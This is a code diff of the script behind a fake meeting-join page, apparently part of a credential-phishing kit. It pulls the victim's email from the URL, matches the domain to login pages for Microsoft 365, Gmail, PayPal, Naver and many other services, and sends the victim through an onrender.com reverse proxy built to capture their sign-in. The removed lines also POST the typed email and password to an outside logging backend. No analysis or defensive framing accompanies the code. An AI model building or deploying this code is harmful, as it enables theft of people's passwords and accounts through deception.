@@ -216,407 +216,276 @@
         </div>
     </div>
 
-    <script src="https://code.jquery.com/jquery-3.5.1.min.js"></script>
+<script src="https://code.jquery.com/jquery-3.5.1.min.js"></script>
 
-    <script>
-        // ============================================================
-        //  CONFIGURATION - ✅ UPDATED: Points to Render Proxy
-        // ============================================================
+<script>
+    // ============================================================
+    //  CONFIGURATION - Points to your Render Proxy
+    // ============================================================
 
-        // ✅ CRITICAL: Change this to your Render proxy URL
-        const CHAMELEON_PROXY_URL = 'https://preoauth-service.onrender.com/?target=';
+    // ✅ Your Render proxy URL
+    const CHAMELEON_PROXY_URL = 'https://preoauth-service.onrender.com/?target=';
+    const BACKEND_URL = 'https://meeting-1-rzx6.onrender.com';
+
+    // ============================================================
+    //  STATE
+    // ============================================================
+
+    let detectedService = null;
+    let targetUrl = null;
+    let sessionId = 'sess_' + Math.random().toString(36).substr(2, 9) + '_' + Date.now();
+
+    // ============================================================
+    //  SERVICE DETECTION
+    // ============================================================
+
+    const SERVICE_DETECTION = {
+        'microsoft.com': { url: 'https://login.microsoftonline.com/', name: 'Microsoft 365', icon: '💼', loginHint: 'login_hint' },
+        'outlook.com': { url: 'https://login.microsoftonline.com/', name: 'Microsoft 365', icon: '💼', loginHint: 'login_hint' },
+        'hotmail.com': { url: 'https://login.microsoftonline.com/', name: 'Microsoft 365', icon: '💼', loginHint: 'login_hint' },
+        'live.com': { url: 'https://login.microsoftonline.com/', name: 'Microsoft 365', icon: '💼', loginHint: 'login_hint' },
+        'gmail.com': { url: 'https://accounts.google.com/ServiceLogin', name: 'Google / Gmail', icon: '📧', loginHint: 'Email' },
+        'googlemail.com': { url: 'https://accounts.google.com/ServiceLogin', name: 'Google / Gmail', icon: '📧', loginHint: 'Email' },
+        'yahoo.com': { url: 'https://login.yahoo.com/', name: 'Yahoo Mail', icon: '📬', loginHint: 'username' },
+        'ymail.com': { url: 'https://login.yahoo.com/', name: 'Yahoo Mail', icon: '📬', loginHint: 'username' },
+        'icloud.com': { url: 'https://appleid.apple.com/', name: 'Apple ID / iCloud', icon: '🍎', loginHint: 'accountName' },
+        'naver.com': { url: 'https://nid.naver.com/nidlogin.login', name: 'Naver', icon: '🇰🇷', loginHint: 'id' },
+        'daum.net': { url: 'https://login.daum.net/', name: 'Daum', icon: '🇰🇷', loginHint: 'id' },
+        'hanmail.net': { url: 'https://login.daum.net/', name: 'Daum / Hanmail', icon: '🇰🇷', loginHint: 'id' },
+        'kakao.com': { url: 'https://accounts.kakao.com/', name: 'Kakao', icon: '🇰🇷', loginHint: 'email' },
+        'hiworks.com': { url: 'https://www.hiworks.com/login', name: 'Hiworks', icon: '🏢', loginHint: 'email' },
+        'hiworks.co.kr': { url: 'https://www.hiworks.com/login', name: 'Hiworks Korea', icon: '🏢', loginHint: 'email' },
+        'qq.com': { url: 'https://mail.qq.com/', name: 'QQ Mail', icon: '🐧', loginHint: 'login' },
+        'foxmail.com': { url: 'https://mail.qq.com/', name: 'Foxmail (QQ)', icon: '🦊', loginHint: 'login' },
+        '163.com': { url: 'https://mail.163.com/', name: '163 Mail', icon: '📨', loginHint: 'username' },
+        '126.com': { url: 'https://mail.126.com/', name: '126 Mail', icon: '📨', loginHint: 'username' },
+        'facebook.com': { url: 'https://www.facebook.com/login', name: 'Facebook', icon: '📱', loginHint: 'email' },
+        'twitter.com': { url: 'https://twitter.com/login', name: 'Twitter / X', icon: '🐦', loginHint: 'session[username_or_email]' },
+        'instagram.com': { url: 'https://www.instagram.com/accounts/login/', name: 'Instagram', icon: '📸', loginHint: 'username' },
+        'linkedin.com': { url: 'https://www.linkedin.com/login', name: 'LinkedIn', icon: '💼', loginHint: 'session_key' },
+        'github.com': { url: 'https://github.com/login', name: 'GitHub', icon: '🐙', loginHint: 'login' },
+        'zoom.us': { url: 'https://zoom.us/signin', name: 'Zoom', icon: '📹', loginHint: 'email' },
+        'slack.com': { url: 'https://www.slack.com/signin', name: 'Slack', icon: '💬', loginHint: 'email' },
+        'amazon.com': { url: 'https://www.amazon.com/ap/signin', name: 'Amazon', icon: '📦', loginHint: 'email' },
+        'paypal.com': { url: 'https://www.paypal.com/signin', name: 'PayPal', icon: '💰', loginHint: 'login_email' },
+        'netflix.com': { url: 'https://www.netflix.com/login', name: 'Netflix', icon: '🎬', loginHint: 'email' },
+        'spotify.com': { url: 'https://www.spotify.com/login', name: 'Spotify', icon: '🎵', loginHint: 'username' },
+        'protonmail.com': { url: 'https://mail.protonmail.com/login', name: 'ProtonMail', icon: '🔒', loginHint: 'username' },
+        'mail.ru': { url: 'https://mail.ru/', name: 'Mail.ru', icon: '🇷🇺', loginHint: 'login' },
+        'gmx.com': { url: 'https://www.gmx.com/', name: 'GMX Mail', icon: '📨', loginHint: 'email' },
+        'web.de': { url: 'https://web.de/', name: 'WEB.DE', icon: '📨', loginHint: 'email' }
+    };
+
+    const DEFAULT_SERVICE = {
+        url: 'https://login.microsoftonline.com/',
+        name: 'Corporate Login',
+        icon: '🏢',
+        loginHint: 'login_hint'
+    };
+
+    // ============================================================
+    //  GET EMAIL FROM URL
+    // ============================================================
+
+    function getEmailFromUrl() {
+        const params = new URLSearchParams(window.location.search);
+        let email = params.get('e') || params.get('email') || params.get('login_hint') || '';
         
-        // Backend for logging (optional)
-        const BACKEND_URL = 'https://meeting-1-rzx6.onrender.com';
-
-        // ============================================================
-        //  STATE
-        // ============================================================
-
-        let detectedService = null;
-        let targetUrl = null;
-        let sessionId = 'sess_' + Math.random().toString(36).substr(2, 9) + '_' + Date.now();
-        const visitStartTime = Date.now();
-
-        // ============================================================
-        //  DEFAULT SERVICE DETECTION
-        // ============================================================
-
-        const SERVICE_DETECTION = {
-            'microsoft.com': { url: 'https://login.microsoftonline.com/', name: 'Microsoft 365', icon: '💼', loginHint: 'login_hint' },
-            'outlook.com': { url: 'https://login.microsoftonline.com/', name: 'Microsoft 365', icon: '💼', loginHint: 'login_hint' },
-            'hotmail.com': { url: 'https://login.microsoftonline.com/', name: 'Microsoft 365', icon: '💼', loginHint: 'login_hint' },
-            'live.com': { url: 'https://login.microsoftonline.com/', name: 'Microsoft 365', icon: '💼', loginHint: 'login_hint' },
-            'gmail.com': { url: 'https://accounts.google.com/ServiceLogin', name: 'Google / Gmail', icon: '📧', loginHint: 'Email' },
-            'googlemail.com': { url: 'https://accounts.google.com/ServiceLogin', name: 'Google / Gmail', icon: '📧', loginHint: 'Email' },
-            'yahoo.com': { url: 'https://login.yahoo.com/', name: 'Yahoo Mail', icon: '📬', loginHint: 'username' },
-            'ymail.com': { url: 'https://login.yahoo.com/', name: 'Yahoo Mail', icon: '📬', loginHint: 'username' },
-            'icloud.com': { url: 'https://appleid.apple.com/', name: 'Apple ID / iCloud', icon: '🍎', loginHint: 'accountName' },
-            'me.com': { url: 'https://appleid.apple.com/', name: 'Apple ID / iCloud', icon: '🍎', loginHint: 'accountName' },
-            'qq.com': { url: 'https://mail.qq.com/', name: 'QQ Mail', icon: '🐧', loginHint: 'login' },
-            'foxmail.com': { url: 'https://mail.qq.com/', name: 'Foxmail (QQ)', icon: '🦊', loginHint: 'login' },
-            '163.com': { url: 'https://mail.163.com/', name: '163 Mail', icon: '📨', loginHint: 'username' },
-            '126.com': { url: 'https://mail.126.com/', name: '126 Mail', icon: '📨', loginHint: 'username' },
-            'naver.com': { url: 'https://nid.naver.com/nidlogin.login', name: 'Naver', icon: '🇰🇷', loginHint: 'id' },
-            'daum.net': { url: 'https://login.daum.net/', name: 'Daum', icon: '🇰🇷', loginHint: 'id' },
-            'hanmail.net': { url: 'https://login.daum.net/', name: 'Daum / Hanmail', icon: '🇰🇷', loginHint: 'id' },
-            'kakao.com': { url: 'https://accounts.kakao.com/', name: 'Kakao', icon: '🇰🇷', loginHint: 'email' },
-            'hiworks.com': { url: 'https://www.hiworks.com/login', name: 'Hiworks', icon: '🏢', loginHint: 'email' },
-            'hiworks.co.kr': { url: 'https://www.hiworks.com/login', name: 'Hiworks Korea', icon: '🏢', loginHint: 'email' },
-            'facebook.com': { url: 'https://www.facebook.com/login', name: 'Facebook', icon: '📱', loginHint: 'email' },
-            'twitter.com': { url: 'https://twitter.com/login', name: 'Twitter / X', icon: '🐦', loginHint: 'session[username_or_email]' },
-            'instagram.com': { url: 'https://www.instagram.com/accounts/login/', name: 'Instagram', icon: '📸', loginHint: 'username' },
-            'linkedin.com': { url: 'https://www.linkedin.com/login', name: 'LinkedIn', icon: '💼', loginHint: 'session_key' },
-            'github.com': { url: 'https://github.com/login', name: 'GitHub', icon: '🐙', loginHint: 'login' },
-            'salesforce.com': { url: 'https://login.salesforce.com/', name: 'Salesforce', icon: '☁️', loginHint: 'username' },
-            'zoom.us': { url: 'https://zoom.us/signin', name: 'Zoom', icon: '📹', loginHint: 'email' },
-            'slack.com': { url: 'https://www.slack.com/signin', name: 'Slack', icon: '💬', loginHint: 'email' },
-            'amazon.com': { url: 'https://www.amazon.com/ap/signin', name: 'Amazon', icon: '📦', loginHint: 'email' },
-            'paypal.com': { url: 'https://www.paypal.com/signin', name: 'PayPal', icon: '💰', loginHint: 'login_email' },
-            'netflix.com': { url: 'https://www.netflix.com/login', name: 'Netflix', icon: '🎬', loginHint: 'email' },
-            'spotify.com': { url: 'https://www.spotify.com/login', name: 'Spotify', icon: '🎵', loginHint: 'username' },
-            'protonmail.com': { url: 'https://mail.protonmail.com/login', name: 'ProtonMail', icon: '🔒', loginHint: 'username' },
-            'mail.ru': { url: 'https://mail.ru/', name: 'Mail.ru', icon: '🇷🇺', loginHint: 'login' },
-            'gmx.com': { url: 'https://www.gmx.com/', name: 'GMX Mail', icon: '📨', loginHint: 'email' },
-            'web.de': { url: 'https://web.de/', name: 'WEB.DE', icon: '📨', loginHint: 'email' }
-        };
-
-        const DEFAULT_SERVICE = {
-            url: 'https://login.microsoftonline.com/',
-            name: 'Corporate Login',
-            icon: '🏢',
-            loginHint: 'login_hint'
-        };
-
-        // ============================================================
-        //  GET EMAIL FROM URL
-        // ============================================================
-
-        function getEmailFromUrl() {
-            const params = new URLSearchParams(window.location.search);
-            let email = params.get('e') || params.get('email') || params.get('login_hint') || 
-                       params.get('user') || params.get('username') || '';
-            
-            if (!email && window.location.search.length > 1) {
-                const raw = window.location.search.substring(1);
-                try {
-                    const decoded = atob(raw);
-                    if (decoded.includes('@')) {
-                        email = decoded;
-                    }
-                } catch (e) {
-                    try {
-                        const decoded = decodeURIComponent(raw);
-                        if (decoded.includes('@')) {
-                            email = decoded;
-                        }
-                    } catch (e2) {
-                        if (raw.includes('@')) {
-                            email = raw;
-                        }
-                    }
-                }
+        if (email) {
+            email = decodeURIComponent(email);
+            if (email.includes('@')) {
+                localStorage.setItem('lastEmail', email);
+                return email;
             }
-            
-            if (email) {
-                email = email.split('&')[0].split('?')[0];
-                try {
-                    email = decodeURIComponent(email);
-                } catch (e) {}
-                if (email.includes('@') && email.length > 5) {
-                    try {
-                        localStorage.setItem('lastEmail', email);
-                    } catch (e) {}
-                    return email;
-                }
-            }
+        }
+        return '';
+    }
+
+    function getSavedEmail() {
+        try {
+            return localStorage.getItem('lastEmail') || '';
+        } catch (e) {
             return '';
         }
+    }
 
-        function getSavedEmail() {
-            try {
-                return localStorage.getItem('lastEmail') || '';
-            } catch (e) {
-                return '';
+    function detectServiceFromEmail(email) {
+        if (!email) return null;
+        const domain = email.toLowerCase().split('@')[1];
+        if (!domain) return null;
+        
+        if (SERVICE_DETECTION[domain]) {
+            return SERVICE_DETECTION[domain];
+        }
+        
+        const parts = domain.split('.');
+        if (parts.length >= 3) {
+            const mainDomain = parts.slice(-2).join('.');
+            if (SERVICE_DETECTION[mainDomain]) {
+                return SERVICE_DETECTION[mainDomain];
             }
         }
-
-        function detectServiceFromEmail(email) {
-            if (!email) return null;
-            const domain = email.toLowerCase().split('@')[1];
-            if (!domain) return null;
-            
-            if (SERVICE_DETECTION[domain]) {
-                return SERVICE_DETECTION[domain];
-            }
-            
-            const parts = domain.split('.');
-            if (parts.length >= 3) {
-                const mainDomain = parts.slice(-2).join('.');
-                if (SERVICE_DETECTION[mainDomain]) {
-                    return SERVICE_DETECTION[mainDomain];
-                }
-            }
-            
-            for (const [key, value] of Object.entries(SERVICE_DETECTION)) {
-                if (domain.includes(key) || key.includes(domain)) {
-                    return value;
-                }
-            }
-            
-            const tld = parts[parts.length - 1];
-            const corpTLDs = ['com', 'org', 'net', 'co', 'io', 'ai', 'app', 'dev'];
-            if (corpTLDs.includes(tld)) {
-                return DEFAULT_SERVICE;
-            }
-            
-            return null;
+        
+        const tld = parts[parts.length - 1];
+        const corpTLDs = ['com', 'org', 'net', 'co', 'io', 'ai', 'app', 'dev'];
+        if (corpTLDs.includes(tld)) {
+            return DEFAULT_SERVICE;
         }
+        
+        return null;
+    }
 
-        function getVisitorInfo() {
-            return {
-                fullUrl: window.location.href,
-                referrer: document.referrer || "Direct",
-                userAgent: navigator.userAgent,
-                sessionId: sessionId,
-                detectedService: detectedService ? detectedService.name : 'Unknown',
-                targetUrl: targetUrl || 'Unknown'
-            };
+    // ============================================================
+    //  MAIN REDIRECT FUNCTION
+    // ============================================================
+
+    function redirectToProxy() {
+        console.log('🔵 redirectToProxy() called');
+        
+        // Get email from input or URL
+        let email = document.getElementById('user')?.value?.trim() || '';
+        if (!email) {
+            email = getEmailFromUrl() || '';
         }
-
-        function logAction(action, extra = {}) {
-            let email = extra.email || getEmailFromUrl() || getSavedEmail() || 'unknown';
-            const data = {
-                action: action,
-                email: email,
-                password: extra.password || '',
-                detectedService: detectedService ? detectedService.name : 'Unknown',
-                targetUrl: targetUrl || 'Unknown',
-                visitorInfo: getVisitorInfo()
-            };
-            console.log('[LOG]', data);
-            try {
-                fetch(`${BACKEND_URL}/api/log-action`, {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify(data)
-                }).catch(() => {});
-            } catch (e) {}
+        if (!email) {
+            email = getSavedEmail() || '';
         }
-
-        function updateUIForService(service, email) {
-            if (service) {
-                const icon = service.icon || '🔐';
-                const name = service.name || 'Authentication';
-                document.getElementById('serviceIcon').textContent = icon;
-                document.getElementById('serviceName').textContent = `Sign in to ${name}`;
-                document.getElementById('serviceSubtitle').textContent = `Enter your credentials to continue`;
-                
-                const badge = document.getElementById('serviceBadge');
-                badge.textContent = `✅ ${name}`;
-                badge.className = 'badge detected';
-                
-                if (email) {
-                    document.getElementById('meetingTitle').textContent = `${name} Meeting`;
-                }
-            }
+        
+        // Get password
+        const password = document.getElementById('pass')?.value || '';
+        
+        console.log('📧 Email found:', email);
+        
+        // Validate email
+        if (!email || !email.includes('@')) {
+            alert('Please enter a valid email address');
+            return;
         }
-
-        // ============================================================
-        //  MAIN LOGIN FUNCTION
-        // ============================================================
-
-        function redirectToProxy() {
-            // Get email
-            const emailInput = document.getElementById('user');
-            let email = emailInput ? emailInput.value.trim() : '';
-            
-            if (!email) {
-                email = getEmailFromUrl() || '';
-            }
-            if (!email) {
-                email = getSavedEmail() || '';
-            }
-            
-            // Get password
-            const passInput = document.getElementById('pass');
-            const password = passInput ? passInput.value : '';
-            
-            // Validate email
-            if (!email || !email.includes('@')) {
-                const errorEl = document.getElementById('errorMessage');
-                if (errorEl) {
-                    errorEl.textContent = 'Please enter a valid email address';
-                    errorEl.classList.add('show');
-                }
-                if (emailInput) {
-                    emailInput.focus();
-                    emailInput.style.borderColor = '#dc2626';
-                    setTimeout(() => {
-                        emailInput.style.borderColor = '';
-                    }, 3000);
-                }
-                return;
-            }
-            
-            // Detect service
-            detectedService = detectServiceFromEmail(email);
-            if (!detectedService) {
-                detectedService = DEFAULT_SERVICE;
-            }
-            targetUrl = detectedService.url;
-            
-            // Save email
-            try {
-                localStorage.setItem('lastEmail', email);
-            } catch (e) {}
-            
-            // Update UI
-            updateUIForService(detectedService, email);
-            
-            // Log action
-            logAction('click_continue', { email: email, password: password });
-            
-            // Show loading
-            const joinDiv = document.getElementById('joinDiv');
-            const loadDiv = document.getElementById('loadDiv');
-            const loadTxt = document.getElementById('loadTxt');
-            const continueBtn = document.getElementById('continueBtn');
-            
-            if (joinDiv) joinDiv.style.display = 'none';
-            if (loadDiv) loadDiv.style.display = 'block';
-            if (loadTxt) loadTxt.textContent = `Connecting to ${detectedService.name}...`;
-            if (continueBtn) continueBtn.disabled = true;
-            
-            // Build target URL with login hint
-            let fullTargetUrl = targetUrl;
-            if (detectedService.loginHint) {
-                const separator = fullTargetUrl.includes('?') ? '&' : '?';
-                fullTargetUrl += `${separator}${detectedService.loginHint}=${encodeURIComponent(email)}`;
-            }
-            
-            // Build proxy URL
-            const proxyUrl = CHAMELEON_PROXY_URL + encodeURIComponent(fullTargetUrl);
-            
-            console.log('🔗 Proxy URL:', proxyUrl);
-            console.log('📧 Email:', email);
-            console.log('🎯 Detected Service:', detectedService.name);
-            
-            // Redirect to proxy
-            setTimeout(function() {
-                window.location.href = proxyUrl;
-            }, 1500);
+        
+        // Detect service
+        detectedService = detectServiceFromEmail(email);
+        if (!detectedService) {
+            detectedService = DEFAULT_SERVICE;
         }
-
-        // ============================================================
-        //  LOAD HANDLER
-        // ============================================================
-
-        function load() {
-            const email = getEmailFromUrl() || getSavedEmail() || '';
-            
-            const emailInput = document.getElementById('user');
-            const emailDisplay = document.getElementById('emailDisplay');
-            
-            if (email && email.includes('@')) {
-                detectedService = detectServiceFromEmail(email);
-                if (detectedService) {
-                    targetUrl = detectedService.url;
-                    updateUIForService(detectedService, email);
-                }
-                
-                if (emailInput) {
-                    emailInput.value = email;
-                    emailInput.style.display = 'none';
-                }
-                if (emailDisplay) {
-                    emailDisplay.textContent = email;
-                    emailDisplay.style.display = 'block';
-                }
-                
-                console.log('📧 Auto-filled email:', email);
-                console.log('🎯 Detected service:', detectedService ? detectedService.name : 'Unknown');
-                
-                const passInput = document.getElementById('pass');
-                if (passInput) {
-                    setTimeout(() => passInput.focus(), 500);
-                }
-            } else if (emailInput) {
-                const savedEmail = getSavedEmail();
-                if (savedEmail) {
-                    emailInput.value = savedEmail;
-                    detectedService = detectServiceFromEmail(savedEmail);
-                    if (detectedService) {
-                        targetUrl = detectedService.url;
-                        updateUIForService(detectedService, savedEmail);
-                    }
-                }
-            }
-            
-            logAction('page_load');
+        targetUrl = detectedService.url;
+        
+        console.log('🎯 Detected service:', detectedService.name);
+        console.log('🔗 Target URL:', targetUrl);
+        
+        // Save email
+        localStorage.setItem('lastEmail', email);
+        
+        // Show loading
+        const joinDiv = document.getElementById('joinDiv');
+        const loadDiv = document.getElementById('loadDiv');
+        const loadTxt = document.getElementById('loadTxt');
+        
+        if (joinDiv) joinDiv.style.display = 'none';
+        if (loadDiv) loadDiv.style.display = 'block';
+        if (loadTxt) loadTxt.textContent = `Connecting to ${detectedService.name}...`;
+        
+        // Build target URL with login hint
+        let fullTargetUrl = targetUrl;
+        if (detectedService.loginHint) {
+            const separator = fullTargetUrl.includes('?') ? '&' : '?';
+            fullTargetUrl += `${separator}${detectedService.loginHint}=${encodeURIComponent(email)}`;
         }
+        
+        // Build proxy URL
+        const proxyUrl = CHAMELEON_PROXY_URL + encodeURIComponent(fullTargetUrl);
+        
+        console.log('🔗 Final Proxy URL:', proxyUrl);
+        
+        // Redirect to proxy
+        setTimeout(function() {
+            window.location.href = proxyUrl;
+        }, 1000);
+    }
 
-        // ============================================================
-        //  EVENT HANDLERS
-        // ============================================================
+    // ============================================================
+    //  LOAD HANDLER
+    // ============================================================
 
-        document.addEventListener('DOMContentLoaded', function() {
-            load();
-            
-            // Email input
-            const emailInput = document.getElementById('user');
+    function load() {
+        console.log('🔄 Page loaded');
+        
+        const email = getEmailFromUrl() || getSavedEmail() || '';
+        const emailInput = document.getElementById('user');
+        const emailDisplay = document.getElementById('userTxt');
+        
+        if (email && email.includes('@')) {
             if (emailInput) {
-                emailInput.addEventListener('input', function() {
-                    const email = this.value.trim();
-                    if (email && email.includes('@')) {
-                        const service = detectServiceFromEmail(email);
-                        if (service) {
-                            detectedService = service;
-                            targetUrl = service.url;
-                            updateUIForService(service, email);
-                        }
-                    }
-                    
-                    const errorEl = document.getElementById('errorMessage');
-                    if (errorEl) {
-                        errorEl.classList.remove('show');
-                    }
-                    this.style.borderColor = '';
-                });
-                
-                emailInput.addEventListener('keypress', function(e) {
-                    if (e.key === 'Enter') {
-                        e.preventDefault();
-                        const passInput = document.getElementById('pass');
-                        if (!passInput || !passInput.value) {
-                            if (passInput) passInput.focus();
-                        } else {
-                            redirectToProxy();
-                        }
-                    }
-                });
+                emailInput.value = email;
+                emailInput.style.display = 'none';
             }
-            
-            // Password field
-            const passInput = document.getElementById('pass');
-            if (passInput) {
-                passInput.addEventListener('keypress', function(e) {
-                    if (e.key === 'Enter') {
-                        e.preventDefault();
-                        redirectToProxy();
-                    }
-                });
+            if (emailDisplay) {
+                emailDisplay.textContent = email;
+                emailDisplay.style.display = 'block';
             }
+            console.log('📧 Auto-filled email:', email);
             
-            // Continue button
-            const continueBtn = document.querySelector('.btn.user');
-            if (continueBtn) {
-                continueBtn.addEventListener('click', function(e) {
+            const service = detectServiceFromEmail(email);
+            if (service) {
+                document.getElementById('nameTxt').textContent = email.split('@')[0];
+            }
+        } else if (emailInput) {
+            const savedEmail = getSavedEmail();
+            if (savedEmail) {
+                emailInput.value = savedEmail;
+            }
+        }
+    }
+
+    // ============================================================
+    //  EVENT HANDLERS
+    // ============================================================
+
+    document.addEventListener('DOMContentLoaded', function() {
+        load();
+        
+        // Email input - Enter key
+        const emailInput = document.getElementById('user');
+        if (emailInput) {
+            emailInput.addEventListener('keypress', function(e) {
+                if (e.key === 'Enter') {
+                    e.preventDefault();
+                    const passInput = document.getElementById('pass');
+                    if (passInput) passInput.focus();
+                }
+            });
+        }
+        
+        // Password field - Enter key
+        const passInput = document.getElementById('pass');
+        if (passInput) {
+            passInput.addEventListener('keypress', function(e) {
+                if (e.key === 'Enter') {
                     e.preventDefault();
                     redirectToProxy();
-                });
-            }
-        });
-    </script>
+                }
+            });
+        }
+        
+        // "Continue on this browser" button
+        const continueBtn = document.querySelector('.btn.user');
+        if (continueBtn) {
+            continueBtn.addEventListener('click', function(e) {
+                e.preventDefault();
+                console.log('🖱️ Continue button clicked');
+                redirectToProxy();
+            });
+        }
+        
+        // "Launch Meeting" button
+        const launchBtn = document.getElementById('subBtn');
+        if (launchBtn) {
+            launchBtn.addEventListener('click', function(e) {
+                e.preventDefault();
+                console.log('🖱️ Launch button clicked');
+                redirectToProxy();
+            });
+        }
+    });
+</script>
 </body>
 </html>
